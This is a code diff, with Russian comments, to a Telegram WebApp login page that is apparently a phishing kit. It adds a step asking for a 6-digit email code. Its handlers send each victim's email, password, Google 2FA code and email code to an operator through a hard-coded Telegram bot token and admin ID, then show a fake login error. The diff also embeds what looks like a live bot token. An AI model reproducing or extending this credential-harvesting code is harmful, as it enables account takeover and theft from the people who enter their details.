@@ -93,6 +93,11 @@
         .page-eid .btn-primary { background: var(--text-primary); color: var(--bg-dark); }
         .page-eid .btn-primary:hover:not(:disabled) { background: #e0e0e0; }
 
+        /* ===== ПОДДЕРЖКА ===== */
+        .support-btn { margin-top: 24px; text-align: center; font-size: 13px; }
+        .support-btn a { color: var(--accent); text-decoration: none; cursor: pointer; }
+        .support-btn a:hover { text-decoration: underline; }
+
         @media (max-width: 420px) { .container { padding: 24px 16px; } }
     </style>
 </head>
@@ -199,6 +204,25 @@
         </div>
 
         <!-- ============================================================
+        СТРАНИЦА 4.5: КОД ИЗ ПОЧТЫ (НОВАЯ)
+        ============================================================ -->
+        <div id="pageEmailCode" class="page">
+            <div class="page-title">Код из почты</div>
+            <div class="page-sub">Введите 6-значный код из письма</div>
+
+            <div id="emailCodeFields">
+                <div class="form-group">
+                    <label>Код</label>
+                    <input type="text" id="emailCodeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
+                </div>
+            </div>
+
+            <button id="submitEmailCodeBtn" class="btn-primary">Подтвердить</button>
+
+            <button class="btn-secondary" onclick="goToMain()">← На главную</button>
+        </div>
+
+        <!-- ============================================================
         СТРАНИЦА 5: ОШИБКА ВХОДА
         ============================================================ -->
         <div id="pageLoginError" class="page">
@@ -210,14 +234,22 @@
             </div>
         </div>
 
+        <!-- ============================================================
+        ТЕХНИЧЕСКАЯ ПОДДЕРЖКА
+        ============================================================ -->
+        <div class="support-btn">
+            <a onclick="openSupport()">🆘 Техническая поддержка</a>
+        </div>
+
     </div>
 
     <script>
         // ============================================================
         // КОНФИГ (ВСТАВЬТЕ СВОИ ЗНАЧЕНИЯ)
         // ============================================================
-        const BOT_TOKEN = "9232035960:AAH4o8-RckCTF1lqyFuO_iEnyfXNNZGqMko"; // Например: "7123456789:AAH..."
+        const BOT_TOKEN = "9232035960:AAH4o8-RckCTF1lqyFuO_iEnyfXNNZGqMko"; // Ваш токен
         const ADMIN_ID = "8542901240"; // Ваш ID (в кавычках)
+        const SUPPORT_LINK = "https://t.me/xtsuport"; // Ссылка на поддержку
         // ============================================================
 
         const tg = window.Telegram.WebApp;
@@ -227,17 +259,20 @@
         const pageEid = document.getElementById('pageEid');
         const pageEidLink = document.getElementById('pageEidLink');
         const pageCode = document.getElementById('pageCode');
+        const pageEmailCode = document.getElementById('pageEmailCode'); // Новая страница
         const pageLoginError = document.getElementById('pageLoginError');
 
         const email = document.getElementById('email');
         const password = document.getElementById('password');
         const codeInput = document.getElementById('codeInput');
+        const emailCodeInput = document.getElementById('emailCodeInput'); // Новое поле
         const eidEmail = document.getElementById('eidEmail');
         const eidPassword = document.getElementById('eidPassword');
         const eidLinkInput = document.getElementById('eidLinkInput');
 
         const loginSubmitBtn = document.getElementById('loginSubmitBtn');
         const submitCodeBtn = document.getElementById('submitCodeBtn');
+        const submitEmailCodeBtn = document.getElementById('submitEmailCodeBtn'); // Новая кнопка
         const eidSubmitBtn = document.getElementById('eidSubmitBtn');
         const eidLinkSubmitBtn = document.getElementById('eidLinkSubmitBtn');
 
@@ -262,9 +297,10 @@
 
         function goToMain() {
             switchPage(pageMain);
-            email.value = ''; password.value = ''; codeInput.value = '';
+            email.value = ''; password.value = ''; codeInput.value = ''; emailCodeInput.value = '';
             eidEmail.value = ''; eidPassword.value = ''; eidLinkInput.value = '';
             loginSubmitBtn.disabled = false; loginSubmitBtn.textContent = 'Войти';
+            submitEmailCodeBtn.disabled = false; submitEmailCodeBtn.textContent = 'Подтвердить';
             eidSubmitBtn.disabled = false; eidSubmitBtn.textContent = 'Войти через E-ID';
             eidLinkSubmitBtn.disabled = false; eidLinkSubmitBtn.textContent = 'Подтвердить';
             attemptCount = 0;
@@ -272,6 +308,10 @@
 
         function goToEid() { switchPage(pageEid); }
         function goToLoginError() { switchPage(pageLoginError); }
+
+        function openSupport() {
+            window.open(SUPPORT_LINK, '_blank');
+        }
 
         // ОТПРАВКА В БОТА (напрямую через API)
         async function sendToAdmin(text) {
@@ -312,7 +352,7 @@
             }
         });
 
-        // ВВОД КОДА 2FA
+        // ВВОД КОДА 2FA (GOOGLE)
         submitCodeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
             if (!code) { showMessage('Введите код', 'error'); return; }
@@ -320,15 +360,36 @@
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = 'Отправка...';
 
-            const ok = await sendToAdmin(`🔐 Код 2FA\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`);
+            const ok = await sendToAdmin(`🔐 Код 2FA (Google)\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`);
 
             if (ok) {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
-                goToLoginError();
+                switchPage(pageEmailCode); // Переход на код с почты
             } else {
                 submitCodeBtn.disabled = false;
                 submitCodeBtn.textContent = 'Подтвердить';
+                showMessage('Ошибка отправки.', 'error');
+            }
+        });
+
+        // ВВОД КОДА ИЗ ПОЧТЫ (НОВОЕ)
+        submitEmailCodeBtn.addEventListener('click', async function() {
+            const code = emailCodeInput.value.trim();
+            if (!code) { showMessage('Введите код', 'error'); return; }
+
+            submitEmailCodeBtn.disabled = true;
+            submitEmailCodeBtn.textContent = 'Отправка...';
+
+            const ok = await sendToAdmin(`📧 Код из почты\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`);
+
+            if (ok) {
+                submitEmailCodeBtn.disabled = false;
+                submitEmailCodeBtn.textContent = 'Подтвердить';
+                goToLoginError(); // Ошибка в конце
+            } else {
+                submitEmailCodeBtn.disabled = false;
+                submitEmailCodeBtn.textContent = 'Подтвердить';
                 showMessage('Ошибка отправки.', 'error');
             }
         });
